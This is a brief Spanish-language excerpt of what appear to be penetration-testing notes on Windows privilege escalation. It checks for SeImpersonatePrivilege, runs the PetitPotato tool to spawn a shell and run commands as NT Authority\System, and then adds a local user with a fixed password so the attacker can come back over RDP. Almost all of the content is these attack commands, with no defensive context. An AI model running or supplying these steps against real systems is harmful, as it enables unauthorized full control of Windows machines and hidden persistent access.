...
```bash 
❯ whoami /priv      # Muestra los privilegios del usuario (SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege)
```
...
```bash 
❯ PetitPotato.exe 3 cmd         # Nos crea una cmd con usuario 'NT Authority\System' 

❯ PetitPotato.exe 3 "whoami"    # Ejecutamos un comando 
	# EfsID = 3 que es el numero de API a usar 

❯ PetitPotato.exe 3 "net user omar P4ssw0rd /add"               # Creamos un usuario siendo 'NT Authority\System'
...
Nota: Despues de crear un usuario para tener persistencia, podemos ingresar a con RDP si esta abierto el puerto '3389'
```
